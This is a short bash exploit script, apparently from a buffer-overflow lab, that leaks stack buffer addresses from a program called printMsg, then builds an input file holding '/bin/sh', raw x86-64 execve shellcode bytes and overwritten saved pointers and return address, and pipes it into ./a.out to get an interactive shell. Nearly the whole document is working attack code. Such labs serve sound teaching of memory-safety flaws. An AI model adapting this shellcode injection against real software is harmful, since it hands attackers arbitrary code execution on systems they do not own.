#!/bin/bash

#Gets the correct password and msg addresses to write into
echo -ne "\n\n\n" | ./printMsg > msg.txt 2> passNoGdb.txt
PASSADDRESS=`cat passNoGdb.txt`
MSGADDRESS=`cat msg.txt`

EXE=`cat myShellCode.txt`

#Converts to proper hex and uses to format attack string
SHELLHEX=`python add3AndConvert.py $PASSADDRESS`
PASSHEX=`python newConvert.py $PASSADDRESS`
MSGHEX=`python newConvert.py $MSGADDRESS`

#Store /bin/sh/ in the message and leave a blank user input 
echo -ne "/bin/sh\0\n\n\0\0\0" > part5NoGdbinput.txt

#Place shellcode into password buffer
#(This code comes from running objdump -d myShellCode and manually copying in bytes)
echo -ne "\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x80\x10\x60\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05" >> part5NoGdbinput.txt

#Continues in buffer - rest of evil, good, ebp, and return value (pointing to shell)
echo -ne "EVILLLL$MSGHEX\0\0\0\0\0$PASSHEX\0\0$SHELLHEX\0\0\n" >> part5NoGdbinput.txt 

#Command to run executable with proper string ( '-' character allows additional input from user to controll the shell )
cat part5NoGdbinput.txt - | ./a.out 

